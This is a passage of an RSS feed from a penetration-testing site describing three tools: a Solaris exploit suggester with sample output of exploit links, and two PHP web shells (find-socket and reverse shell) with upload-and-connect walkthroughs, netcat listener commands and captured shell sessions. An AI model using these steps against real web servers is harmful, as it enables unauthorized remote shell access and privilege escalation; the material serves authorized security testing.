					<wfw:commentRss>https://pentestmonkey.net/tools/audit/unix-privesc-check/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>exploit-suggester</title>
		<link>https://pentestmonkey.net/tools/audit/exploit-suggester</link>
					<comments>https://pentestmonkey.net/tools/audit/exploit-suggester#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 29 Sep 2007 20:36:39 +0000</pubDate>
				<category><![CDATA[Audit]]></category>
		<category><![CDATA[exploitsuggester]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[tool]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=108</guid>

					<description><![CDATA[This tool reads the output of &#8220;showrev -p&#8221; on Solaris machines and outputs a list of exploits that you might want to try.Â  It currently focusses on local exploitation of Solaris 8 on SPARC, but other version of Solaris are partially supported. Features The current version of exploit-suggester has the following features: Restrict search to [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>This tool reads the output of &#8220;showrev -p&#8221; on Solaris machines and outputs a list of exploits that you might want to try.Â  It currently focusses on local exploitation of Solaris 8 on SPARC, but other version of Solaris are partially supported.</p>
<h3>Features</h3>
<p>The current version of exploit-suggester has the following features:</p>
<ul>
<li>Restrict search to only remote exploits (or local) using the -l option.</li>
<li>Perfom the search remotely &#8211; no need to upload exploit-suggester to target system.</li>
<li>Restrict search by rating so you can show only exploits that are likely to succeed (-r / -R options).</li>
<li>Displays URL for further reading and exploit download.</li>
</ul>
<h3>Download</h3>
<p><a href="http://pentestmonkey.net/tools/exploit-suggester/exploit-suggester-0.3.tar.gz">exploit-suggester-0.3.tar.gz</a></p>
<h3></h3>
<p><span id="more-108"></span></p>
<h3>Preamble</h3>
<p>After gaining access to a low-privelege account during a pentest (e.g. through password guessing or a remote exploit) the next stage is usually to try to escallate privelges to root.Â  Techniques typically include:</p>
<ul>
<li>Manipulation of any custom tools which might installed (SUID files, cron jobs)</li>
<li>Obtaining credentials from backup files which have weak file permissions</li>
<li>Exploiting any local trust relationships (.rhosts, SSH keys)</li>
<li>Trojaning the PATH if weak file permissions have been set on directories</li>
<li>Password guessing now you have a full list of usernames</li>
<li>Manipulation of 3rd part tools that have been installed (e.g. weak file permission on config files or in /etc/init.d)</li>
<li>Exploitation of public vulnerabiliites in software that&#8217;s currently installed</li>
</ul>
<p>This tools focusses purely on the last technique.Â  This tool aims to help you quickly identify which vulnerbilities exist because of poor patching, and gives you a link to publicy available exploit code.</p>
<p>Good pentesters are more than capable of manually identifying which local exploits a system is susceptible to.Â  However, this process can be a little slow and sometimes degenerates into a tedeous trial and error process.Â  This tool aims to speed up the process by suggesting which exploits to try first.</p>
<h3>What the tool does</h3>
<p>It reads in a list of installed patches, correlates this information against a small internal database and lists plublic exploits which may help you on your quest for root.Â  Links are provided so that you can download the exploit and read about the vulnerability.</p>
<p>Some remote exploits are also listed because it was easy to implement.Â  However, this is of limited to use for remote tests as you need the patch list in order to generate a list of possible sploits.</p>
<h3>What the tool doesn&#8217;t do</h3>
<p>Exploit-suggester does NOT list all missing patches.Â  Other tools such as <a href="http://www.par.univie.ac.at/solaris/pca/">Patch Check Advanced</a> do this job very effectively.Â  Exploit-suggester purposefully omits details of vulnerabilities for which public exploit code is not available.</p>
<p>It does not aim to reference all known exploit code, just to list enough help you get root.</p>
<p>It doesn&#8217;t provide the exploit code or tell you how to use it.Â  It simply points you in the right direction.</p>
<p>Links to descriptions of the vulnerabilities are provided, but this tool will not tell you about about the nature of the vulnerbility, fixes, recommendations or anything else that might help with reporting.</p>
<h3>Installation</h3>
<p>Exploit-suggester is just a PERL script, so installation should be trivial.Â  Simply place exploit-suggester.pl somehwere in your PATH.Â  The database file sploitdb.xml must be in the same directory as exploit-suggester.pl.</p>
<p>You may need to install the XML::Simple PERL module first.Â  If it&#8217;s not available through your package manager, you can get it from CPAN:</p>
<pre># perl -MCPAN -e shell</pre>
<pre>&gt; install XML::Simple</pre>
<h3>Example Output</h3>
<pre>$ head showrev.out
Patch: 109618-01 Obsoletes:  Requires:  Incompatibles:  Packages: SUNWeuxwe, SUNWeuezt, SUNWeudlg, SUNWeudda
Patch: 109889-01 Obsoletes: 109353-04 Requires:  Incompatibles:  Packages: SUNWkvmx, SUNWkvm, SUNWmdb, SUNWhea, SUNWpstl, SUNWpstlx
Patch: 110369-05 Obsoletes: 110709-02 Requires:  Incompatibles:  Packages: SUNWkvmx, SUNWcarx, SUNWcsr</pre>
<pre>...</pre>
<pre>$ ./exploit-suggestions.pl 8 sparc showrev.out
exploit-suggester v0.1 ( http://pentestmonkey.net/tools/exploit-suggester )

 -------------------------------------------------------------
|                     Runtime options                         |
 -------------------------------------------------------------
Solaris version: ................ 8
Architecture: ................... sparc
Patch file: ..................... showrev.out
Exploit database: ............... sploitdb.txt
Don't list sploits rated as ..... N/A - Exclude no ratings
List only sploits rated as ...... N/A - List any rating
List only local sploits ......... N/A - Show both

 -------------------------------------------------------------
|                   Suggested Exploits                        |
 -------------------------------------------------------------
Description:          'at' Arbitrary File Deletion
Remote:               0
Exploit Rating:       1 (Sploit normally works)
Patch installed:      108875-10
Min vulnerable patch: 108875-00
Max vulnerable patch: 108875-12
Exploit Link:         http://www.securityfocus.com/data/vulnerabilities/exploits/isec-solaris-at-rm.c
Exploit Link:         http://www.securityfocus.com/data/vulnerabilities/exploits/solaris-at.c
Info Link:            http://securityfocus.com/bid/6693

Description:          /usr/ucb/ps information leakage
Remote:               0
Exploit Rating:       1 (Sploit normally works)
Patch installed:      109023-01
Min vulnerable patch: 109023-00
Max vulnerable patch: 109023-05
Exploit Link:         http://milw0rm.com/exploits/2242
Note:                 Local environment variable leakage: /usr/ucb/ps -auxgeww

Description:          KCMS Arbitrary File Reading Vulnerability
Remote:               1
Exploit Rating:       1 (Sploit normally works)
Patch installed:      111400-01
Min vulnerable patch: 111400-00
Max vulnerable patch: 111400-01
Exploit Link:         http://www.securityfocus.com/data/vulnerabilities/exploits/solaris_kcms_readfile.pm
Info Link:            http://securityfocus.com/bid/6665

Description:          X11 Keyboard Extension Overflow
Remote:               0
Exploit Rating:       1 (Sploit normally works)
Patch installed:      119067-00
Min vulnerable patch: 119067-00
Max vulnerable patch: 119067-03
Exploit Link:         http://www.securityfocus.com/data/vulnerabilities/exploits/raptor_xkb.c
Info Link:            http://www.securityfocus.com/bid/19905

Description:          libdthelp Overflow Privilege Escalation
Remote:               0
Exploit Rating:       1 (Sploit normally works)
Patch installed:      108949-07
Min vulnerable patch: 108949-00
Max vulnerable patch: 108949-08
Exploit Link:         http://www.securityfocus.com/data/vulnerabilities/exploits/raptor_libdthelp.c
Info Link:            http://www.securityfocus.com/bid/8973

Description:          priocntl Vulnerability
Remote:               0
Exploit Rating:       1 (Sploit normally works)
Patch installed:      108528-13
Min vulnerable patch: 108528-00
Max vulnerable patch: 108528-17
Exploit Link:         http://archive.cert.uni-stuttgart.de/bugtraq/2002/11/msg00359.html
Info Link:            http://securityfocus.com/bid/6262

Description:          sadmind Authentication Spoofing
Remote:               1
Exploit Rating:       1 (Sploit normally works)
Patch installed:      116455-00
Min vulnerable patch: 116455-00
Max vulnerable patch: 116455-00
Exploit Link:         http://www.securityfocus.com/data/vulnerabilities/exploits/solaris_sadmind_exec.pm
Exploit Link:         http://www.securityfocus.com/data/vulnerabilities/exploits/rootdown.plm
Info Link:            http://securityfocus.com/bid/8615

Description:          vfs_getvfssw Kernel Module Loading Vulnerability
Remote:               0
Exploit Rating:       1 (Sploit normally works)
Patch installed:      108528-13
Min vulnerable patch: 108528-00
Max vulnerable patch: 108528-26
Exploit Link:         http://www.securityfocus.com/data/vulnerabilities/exploits/solaris_vfs_getvfssw.tar
Info Link:            http://securityfocus.com/bid/9962
Note:                 DoS risk if you insert the wrong kernel module

Description:          whodo Overflow
Remote:               0
Exploit Rating:       2 (Sploit untested)
Patch installed:      111826-00
Min vulnerable patch: 111826-00
Max vulnerable patch: 111826-00
Exploit Link:         http://www.securityfocus.com/data/vulnerabilities/exploits/whodoexp.c
Info Link:            http://securityfocus.com/bid/2935

Description:          LD_PRELOAD Privilege Escalation
Remote:               0
Exploit Rating:       3 (Sploit normally fails)
Patch installed:      109147-12
Min vulnerable patch: 109147-07
Max vulnerable patch: 109147-24
Exploit Link:         http://www.securityfocus.com/data/vulnerabilities/exploits/raptor_ldpreload.c
Info Link:            http://www.securityfocus.com/bid/8305/info

Description:          libsldap Overflow
Remote:               0
Exploit Rating:       3 (Sploit normally fails)
Patch installed:      111091-00
Min vulnerable patch: 111091-00
Max vulnerable patch: 111091-02
Exploit Link:         http://www.securityfocus.com/data/vulnerabilities/exploits/libsldap-exp.c
Exploit Link:         http://www.securityfocus.com/data/vulnerabilities/exploits/ldap_exp2.c
Info Link:            http://securityfocus.com/bid/2931</pre>
<p><strong>Limitations</strong></p>
<p>Currently the database is biased towards exploiting Solaris 8 on SPARC.Â  I&#8217;ll update the database to more fully support other flavours of Solaris later.Â  I might also implement limited support for Windows and Linux too at some stage.</p>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/audit/exploit-suggester/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>php-findsock-shell</title>
		<link>https://pentestmonkey.net/tools/web-shells/php-findsock-shell</link>
					<comments>https://pentestmonkey.net/tools/web-shells/php-findsock-shell#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 02 Sep 2007 15:26:26 +0000</pubDate>
				<category><![CDATA[Web Shells]]></category>
		<category><![CDATA[findsockshell]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[php]]></category>
		<category><![CDATA[tool]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=112</guid>

					<description><![CDATA[This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PHP, you want an interactive shell, but the Firewall is doing proper egress and ingress filtering &#8211; so bindshells and reverse shells won&#8217;t work. Upload php-findsock-shell to somewhere in the web root then run it [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PHP, you want an interactive shell, but the Firewall is doing proper egress and ingress filtering &#8211; so bindshells and reverse shells won&#8217;t work.</p>
<p>Upload php-findsock-shell to somewhere in the web root then run it by accessing the appropriate URL via netcat (as opposed to via a browser).Â  Instead of getting a normal HTTP response back, your HTTP session becomes an interactive shell session:</p>
<pre>$ nc -v target 80
target [10.0.0.1] 80 (http) open
GET /php-findsock-shell.php HTTP/1.0

sh-3.2$ id
uid=80(apache) gid=80(apache) groups=80(apache)
sh-3.2$
... you now have an interactive shell ...</pre>
<p>This will be a proper interactive shell in which you can run interective programs like telnet, ssh and su.Â  It differs from web form-based shells which allow you to send a single command, then return you the output.</p>
<p><span id="more-112"></span></p>
<h2>Download</h2>
<p><a href="http://pentestmonkey.net/tools/php-findsock-shell/php-findsock-shell-1.0.tar.gz">php-findsock-shell-1.0.tar.gz</a></p>
<p>MD5sum: aecfea69fc6b482709f339756d6b419b</p>
<p>SHA1sum: 96e1a89cb15dcb64d81a13c2211faf98e80d3518</p>
<h2>Preamble</h2>
<p>I recently read about some (old) <a href="http://www.securityfocus.com/archive/1/archive/1/449298/100/0/threaded">vulnerabilities</a> stemming from the fact that PHP scripts inherit some of Apache&#8217;s file descriptors and that programs run via PHP (e.g. via the &#8220;system&#8221; function) also inherit these file descriptors.Â  Vulnerabilities include:</p>
<ul>
<li>Overwriting apache log file &#8211; even though it&#8217;s owned by root; and</li>
<li>Hijacking apache&#8217;s listening TCP port, then killing apache so you can respond to incoming web requests</li>
</ul>
<p>This whole &#8220;inheriting file handles&#8221; class of vulnerability seems like an interesting area &#8211; albeit not a new area.</p>
<p>It occurred to me that if PHP could directly access the file handle corresponding to the TCP connection between the user&#8217;s browser and the web server, PHP might be able to attach a shell (/bin/sh) to this connection.Â  You&#8217;d then have an interactive shell which would pass straight through firewalls doing simple ingress and egree filtering.</p>
<p>Alas, I couldn&#8217;t figure out how to implement this idea purely in PHP.Â  However, with the help of a C program it&#8217;s possible to demonstrate that the idea works.</p>
<h2>Walk Through</h2>
<h3>Modify the source to prevent unauthorised access</h3>
<p>To prevent someone else from abusing your backdoor &#8211; a nightmare scenario while pentesting &#8211; you should modify the source code to prevent unauthorised access to your script.Â  This is left as an exercise to the reader.Â  I haven&#8217;t implemented this in v1.0.</p>
<h3>Compile findsock.c</h3>
<p>You need to compile findsock.c so that it&#8217;ll run on the web server you&#8217;ve gained access to.Â  If you&#8217;re running the same OS and architecture run the following locally:</p>
<p>$ gcc -o findsock findsock.c</p>
<p>If not, then you might have to compile elsewhere, or hope there&#8217;s a C compiler on the web server.</p>
<h3>Upload &#8220;findsock&#8221; and &#8220;php-findsock-shell.php&#8221;</h3>
<p>Upload the compiled binary plus the PHP script to the web server.</p>
<h3>Enjoy your new shell</h3>
<p>Access the PHP script using netcat (not using a browser).Â  If all went well, your HTTP connection should turn into an interactive shell:</p>
<pre>$ nc -v target 80
target [10.0.0.1] 80 (http) open
GET /php-findsock-shell.php HTTP/1.0</pre>
<pre>sh-3.2$ id
uid=80(apache) gid=80(apache) groups=80(apache)
sh-3.2$
... you now have an interactive shell ...</pre>
<h2>FAQs</h2>
<h3>When is this useful?</h3>
<p>When you can&#8217;t use a bindshell or reverse shell because of Firewall filtering.</p>
<p>Proper interactive shells are more useful than web-based shell in some circumstances, e.g:</p>
<ul>
<li>You want to change your user with &#8220;su&#8221;</li>
<li>You want to upgrade your shell using a local exploit</li>
<li>You want to log into another system using telnet / ssh</li>
</ul>
<h3>Isn&#8217;t the shell connection just going to be severed when the web server times out the PHP script?</h3>
<p>No.Â  It doesn&#8217;t seem to on the systems that I&#8217;ve tested it on (Gentoo Linux only so far).</p>
<h3>Isn&#8217;t there going to be a rather suspicious looking shell process when the admin runs &#8220;ps&#8221;?</h3>
<p>Yeah.Â  <img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<h3>Will this work with PERL as well as PHP?</h3>
<p>I doesn&#8217;t seem to.Â  The PERL script doesn&#8217;t to inherit any interesting file handles.Â  It just has its STDIN, STDOUT and STDERR attached to a pipe.Â  However, I&#8217;m sure that there&#8217;s more than one way to configure PERL with Apache, so maybe other configurations will be prone the above problem.</p>
<h2>Caveats</h2>
<p>The shell traffic doesn&#8217;t look much like HTTP, so I guess that you may have problems if the site is being protected by a Layer 7 (Application layer) Firewall.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/web-shells/php-findsock-shell/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>php-reverse-shell</title>
		<link>https://pentestmonkey.net/tools/web-shells/php-reverse-shell</link>
					<comments>https://pentestmonkey.net/tools/web-shells/php-reverse-shell#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 26 May 2007 17:01:40 +0000</pubDate>
				<category><![CDATA[Web Shells]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[php]]></category>
		<category><![CDATA[reverseshell]]></category>
		<category><![CDATA[tool]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=111</guid>

					<description><![CDATA[This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PHP.Â  Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.Â  The script will open an outbound TCP connection from the webserver to a host [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PHP.Â  Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.Â  The script will open an outbound TCP connection from the webserver to a host and port of your choice.Â  Bound to this TCP connection will be a shell.</p>
<p>This will be a proper interactive shell in which you can run interective programs like telnet, ssh and su.Â  It differs from web form-based shell which allow you to send a single command, then return you the output.<br />
<span id="more-111"></span></p>
<h2>Download</h2>
<p><a href="http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz">php-reverse-shell-1.0.tar.gz</a></p>
<p>MD5sum:2bdf99cee7b302afdc45d1d51ac7e373</p>
<p>SHA1sum: 30a26d5b5e30d819679e0d1eb44e46814892a4ee</p>
<h2>Video</h2>
<p>I stumbled across thisÂ <a href="http://www.youtube.com/watch?v=A0Ks4MfhVIE">video</a> someone made of php-reverse-shell.</p>
<p><em>Update 2011-11: Imax sent me a link to his toolÂ <a href="http://code.google.com/p/fimap/">fimap</a>Â which uses php-reverse-shell. Â Looks cool.</em></p>
<h2>Walk Through</h2>
<h3>Modify the source</h3>
<p>To prevent someone else from abusing your backdoor &#8211; a nightmare scenario while pentesting &#8211; you need to modify the source code to indicate where you want the reverse shell thrown back to.Â  Edit the following lines of php-reverse-shell.php:</p>
<pre>$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS</pre>
<h3>Get Ready to catch the reverse shell</h3>
<p>Start a TCP listener on a host and port that will be accessible by the web server.Â  Use the same port here as you specified in the script (1234 in this example):</p>
<pre>$ nc -v -n -l -p 1234</pre>
<h3>Upload and Run the script</h3>
<p>Using whatever vulnerability you&#8217;ve discovered in the website, upload php-reverse-shell.php.Â  Run the script simply by browsing to the newly uploaded file in your web browser (NB: You won&#8217;t see any output on the web page, it&#8217;ll just hang if successful):</p>
<pre>http://somesite/php-reverse-shell.php</pre>
<h3>Enjoy your new shell</h3>
<p>If all went well, the web server should have thrown back a shell to your netcat listener.Â  Some useful commans such as w, uname -a, id and pwd are run automatically for you:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58012
Linux somehost 2.6.19-gentoo-r5 #1 SMP PREEMPT Sun Apr 1 16:49:38 BST 2007 x86_64 AMD Athlon(tm) 64 X2 Dual Core Processor 4200+ AuthenticAMD GNU/Linux
 16:59:28 up 39 days, 19:54,  2 users,  load average: 0.18, 0.13, 0.10
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root   :0        19May07 ?xdm?   5:10m  0.01s /bin/sh
uid=81(apache) gid=81(apache) groups=81(apache)
sh: no job control in this shell
sh-3.2$</pre>
<h2>FAQs</h2>
<h3>When is this useful?</h3>
<p>Perhaps the only areas on disk that you have write access to are mounted with the &#8220;noexec&#8221; option.Â  Uploading a compiled program will be of no use in these situations.Â  You need to use an installed scripting language like Python, PERL, PHP, etc.<br />
Perhaps you just can&#8217;t be bothered to upload a second program.</p>
<h3>Isn&#8217;t the shell connection just going to be severed when the web server times out the PHP script?</h3>
<p>No.Â  It doesn&#8217;t seem to on the systems that I&#8217;ve tested it on (Gentoo Linux only so far).Â  Additionally the PHP script attempts to daemonise itself and dissociate from the parent process to avoid this (though it rarely works in practise).Â  Your browser will appear to hang when you access the reverse shell.Â  This is normal.Â  It&#8217;s OK to hit cancel in your browser once you&#8217;ve got your shell.</p>
<h3>Isn&#8217;t there going to be a rather suspicious looking shell process when the admin runs &#8220;ps&#8221;?</h3>
<p>Yeah.Â  This version of the reverse shell isn&#8217;t very subtle:</p>
<pre>apache   28106  0.0  0.0  10428  1216 ?        S    17:15   0:00 sh -c uname -a; w; id; /bin/sh -i
apache   28110  0.0  0.0  10172  1428 ?        S    17:15   0:00 /bin/sh -i</pre>
<h3>Is this page available in Serbo-Croatian?</h3>
<p>Yes. <a href="http://science.webhostinggeeks.com/php-obrnute-ljusture">Thanks to Jovana Milutinovich for translating</a>.</p>
<h2>Caveats</h2>
<p>Outbound firewalling (aka egress filtering) may prevent your reverse shell connection reaching you.Â  Pick a port that&#8217;s allowed through Firewall.Â  If there are none, you&#8217;ll have to make do with a form-based PHP shell.</p>
<p>This particular implementation of the reverse shell is unix-based.Â  You&#8217;ll need to modify it before it will work on windows.</p>
<p>I&#8217;ve noticed a couple of zombie processes while testing this shell.Â  It doesn&#8217;t always happen, but is probably to be expected since we&#8217;re not daemonising ourself properly.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/web-shells/php-reverse-shell/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
